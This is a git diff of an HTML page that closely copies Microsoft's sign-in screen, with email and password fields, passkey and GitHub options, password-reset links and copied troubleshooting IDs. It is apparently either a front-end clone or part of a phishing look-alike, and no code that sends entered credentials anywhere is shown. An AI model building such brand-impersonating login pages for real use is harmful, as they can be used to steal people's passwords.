@@ -9,36 +9,57 @@
 </head>
 <body>
 <main id="main">
-  <div id="overlay" class="hidden"></div>
-  <div class="main-box">
+  <div class="main box">
     <img id="logo-small" class="logotype" src="assets/images/logo_rect.svg" alt="company logotype">
     <div id="sign-in-title" class="sing-in-title">Sign in</div>
     <div id="sign-in-options-title" class="sing-in-title">Sign-in options</div>
-    <div id="error-message">Enter a valid email address, phone number, or Skype name.</div>
+    <div id="cant-access-title" class="sing-in-title">Which type of account do you need with?</div>
+    <div id="error-message-login">Enter a valid email address, phone number, or Skype name.</div>
     <div id="entered-email">
       <img src="assets/images/arrow(left).svg" alt="arrow left" id="arrow" />
       <div id="enter-message"></div>
     </div>
+
     <div class="sing-in-options-menu">
-      <div class="use-your-device">
+      <a href="https://login.microsoft.com/common/fido/get?uiflavor=Host" class="use-your-device">
         <img src="assets/images/use-your-device-logo.svg" alt="use your device logo"/>
         <div class="use-device-text">
           <div class="sign-in-option-item-title">Face, fingerprint, PIN or security key</div>
           <div class="sign-in-option-item-description">Use your device to sign in with a passkey.</div>
         </div>
         <img src="assets/images/question-mark-logo.svg" alt="question mark logo"/>
-      </div>
-      <div class="use-your-device">
+      </a>
+      <a href="https://login.live.com/HandleGithubResponse.srf?code=ab85fa7a0e3fa306ce86&state=A71C8C9801BACA09"
+         class="use-your-device">
         <img src="assets/images/github-logo.svg" alt="use your device logo"/>
         <div class="use-device-text">
           <div class="sign-in-option-item-title">Sign In with GitHub</div>
           <div class="sign-in-option-item-description">Personal accounts only</div>
         </div>
         <img src="assets/images/question-mark-logo.svg" alt="question mark logo"/>
-      </div>
-      <div class="use-github"></div>
+      </a>
     </div>
+
+    <div class="cant-access-menu">
+      <a href="https://passwordreset.microsoftonline.com" class="use-your-device">
+        <img src="assets/images/work_or_school_logo.svg" alt="use your device logo"/>
+        <div class="use-device-text">
+          <div class="sign-in-option-item-title">Work or school account</div>
+          <div class="sign-in-option-item-description">Created by your IT department</div>
+        </div>
+      </a>
+      <a href="https://account.live.com/password/reset?wreply=https%3a%2f%2flogin.microsoftonline.com%2fcommon%2freprocess%3fctx%3drQQIARAAnZO7j-NkFMXjSSbMDo-JWCSGbgoKBHyJHdt5iSmcxImdOONJnHcT-fH5kdj-_M7jDwBEtQUFrKh2K6gQ1UIFDUJToBUSCG2FQDRTICiQtsQrWipucXXPkU51fvf0hCpWiCJZxN_Mlot44_UaoUNZhRqgNU0DFAGroKZAHZCwjMvlSq2uKNXg5dPCD8O77z74_qb55fknrzxafPrXZ1jNjCIvbJRKsqqi2I2KjqUGKER6VFSRU5LjyCylh2fDCILQMlzLBeiZ-wjDHmPYB0c5AifJJ0dnIpOa5WcLBdYB3h4d28iw3PvZb7McFfLMv8MyDCmWy732IBU4t_J8CvbtaLSeKJoZo8BYS_MO2_HnM4EGIlHfto1IqYouCDp8POkZpKJyQX8aqGnOu2Zp2tkH-_bcUHxy7gc2ParU53PHY1qGu_PZA-DGqwMNQsrtNLnuCIVmKLkiRUtIlSTTtaNu0hvgCu_x9e1mqxyuyLhrVvpDfkXNUEDj0NwaZUHlJNzBu1Qr1JuKGoqJsFSuY0Pa81UwneB9ncbjQOIWNVFadvpJl9Wau0ipOXAmt63EirmxqoHugarw6xlV9aM1z4zFaEnBsb4RNBqFOyZVXuCI1PTq-mpPxFW27VPilJ1ZuiJvBy0XHxNhxTbl5rYdAs3sOP2hs4jrirDpxdZ-N7JpqiLEW7a-AU3Os3R1uNwvobOkCEdci8tFrE4jOPXjCqwekkMdzO1K6yoIhrKzdcFamkzKXQaMViBZduYiV-XByPVwwIi7wMF7hpHWxnyRzacgOMi9ybIhDBJLhY3Gf1LTaAya_EqShAvkQdfSLrwA6ZYNL5Cu25YLV2kKhuHPWexxDrvNvXqSK1yeZy8ybzyPZxt3Tn47K2TOMxeZpznswXEK7U_5Vva1hx_yH79XnZDv3M_cHJc4dhF3BqSqH7ZEkmz8YWtizrmEs11vqPQR35TTjnszidpsLskGcS-P3cvfvcm_MJAYodiG4SZC3p_5o_efy3x1539_wEen2NcvZp6-9ON3vz78_e9v_uBuz94WBK85nITl66gE66zkaW_JbbQmxHa4GHNEK_F80pu0mNKms7j8vJD5pZD5Bw2&mkt=en-US"
+         class="use-your-device">
+        <img src="assets/images/personal_account_logo.svg" alt="use your device logo"/>
+        <div class="use-device-text">
+          <div class="sign-in-option-item-title">Personal account</div>
+          <div class="sign-in-option-item-description">Created by you</div>
+        </div>
+      </a>
+    </div>
+
     <div id="enter-pass-title" class="sing-in-title password">Enter password</div>
+    <div id="error-message-password">Please enter your password.</div>
 
     <input id="input-email" type="email" class="data-input" placeholder="Email, phone, or Skype">
     <input id="input-password" type="password" class="data-input" placeholder="Password">
@@ -56,6 +77,31 @@
     <div class="lower-block-image"></div>
     <div class="lower-block-text">Sign-in options</div>
   </div>
+
+  <div class="box troubleshooting-block">
+
+    <div class="trouble-first-block">
+      <div class="trouble-title">Troubleshooting details</div>
+      <div class="trouble-subtitle">If you contact your administrator, send this info to them.</div>
+      <a class="trouble-subtitle-link">Copy info to clipboard</a>
+    </div>
+
+    <div class="trouble-second-block">
+      <div class="error-code"><b>Error code: </b>50058</div>
+      <div class="request-id"><b>Request Id: </b>37a5069a-5585-4531-8221-8307b6b71f00</div>
+      <div class="correlation-id"><b>Correlation Id: </b>861351d2-cea2-42ca-b918-9c14b859a9f1</div>
+      <div class="timestamp"><b>Timestamp: </b>2024-11-18T09:33:45.453Z</div>
+    </div>
+
+    <div class="trouble-third-block">
+      <div class="trouble-flags">Flag sign-in errors for review: <a href="#">Enable flagging</a></div>
+      <div class="trouble-flags-description">
+        If you plan on getting help for this problem, enable flagging and try to reproduce the error within 20 minutes. Flagged events make diagnostics available and are raised to admin attention.
+      </div>
+    </div>
+    <img src="assets/icons/cross_black.svg" alt="cross icon" class="cross-icon"/>
+  </div>
+
 </main>
 <footer class="footer">
   <div class="terms"><a target="_blank" href="https://www.microsoft.com/en-US/servicesagreement">Terms of use</a></div>
